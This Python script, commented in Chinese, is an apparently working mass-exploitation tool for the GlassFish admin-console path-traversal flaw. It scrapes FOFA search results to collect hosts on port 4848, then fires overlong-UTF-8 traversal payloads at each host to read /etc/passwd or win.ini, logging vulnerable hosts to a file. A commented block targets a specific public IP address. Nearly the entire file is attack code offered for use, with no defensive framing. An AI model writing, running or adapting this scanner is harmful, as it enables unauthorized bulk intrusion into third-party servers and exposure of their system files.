#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import requests
import base64
from lxml import etree
import time
import sys

'''
url='http://186.202.17.69:4848/'
payload_linux='theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
payload_windows='theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'

#data_linux=requests.get(url+payload_linux)#获取请求后的返回源代码
#data_windows=requests.get(url+payload_windows)#获取请求后的返回源代码

data_linux_status_code=requests.get(url+payload_linux).status_code#获取请求后的返回状态码
data_windows_status_code=requests.get(url+payload_windows).status_code#获取请求后的返回状态码

if data_linux_status_code==200 or data_windows_status_code==200:
    print("漏洞存在")
else:
    print("漏洞不存在")

#print(data_linux.content.decode('utf-8'))#打印出返回源代码
#print(data_windows.content.decode('utf-8'))#打印出返回源代码
print(data_linux_status_code)#打印返回状态码
print(data_windows_status_code)#打印返回状态码
'''

'''
如何实现这个漏洞的批量化
1.获取到可能存在漏洞的地址信息-借助Fofa进行获取目标
    1.2将请求的数据进行筛选
2.批量请求地址信息进行判断是否存在-单线程多线程
'''
def fofa_search(search_data,page):
    #search_data = '"glassfish" && port="4848" && country="CN"'
    headers = {'cookie': 'hahanihao'}
    for yeshu in range(1, page+1):
        url = 'https://fofa.info/result?page=' + str(yeshu) + '&qbase64='
        search_data_bs = str(base64.b64encode(search_data.encode('utf-8')), "utf-8")
        urls = url + search_data_bs

        try:
            print('正在提取第' + str(yeshu) + '页')
            result = requests.get(urls, headers=headers, timeout=1).content.decode('utf-8')

            soup = etree.HTML(result)
            ip_data = soup.xpath('//div[@class="re-domain"]/a[@target="_blank"]/@href')  # 略
            ipdata = '\n'.join(ip_data)
            print(ipdata)
            with open(r'ip.txt', 'a+') as f:
                f.write(ipdata + '\n')
            time.sleep(0.5)
        except Exception as e:
            # time.sleep(2)
            pass


def check_vuln():
    payload_linux = 'theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    payload_windows = 'theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'

    for ip in open('C:\Users\LENOVO\Desktop\ip.txt'):
        ip = ip.replace('\n', '')
        # print(ip)
        windows_url = ip + payload_windows
        linux_url = ip + payload_linux
        # print(windows_url)
        # print(linux_url)

        try:
            vuln_code_l = requests.get(linux_url).status_code
            vuln_code_w = requests.get(windows_url).status_code
            print("check->" + ip)
            if vuln_code_l == 200 or vuln_code_w == 200:
                with open(r'vuln.txt', 'a+') as f:
                    f.write(ip + '\n')
            time.sleep(0.5)
        except Exception as e:
            pass


if __name__ == '__main__':
    search=sys.argv[1]
    page=sys.argv[2]
    #参数有空格的处理？？
    fofa_search(search,int(page))
    check_vuln()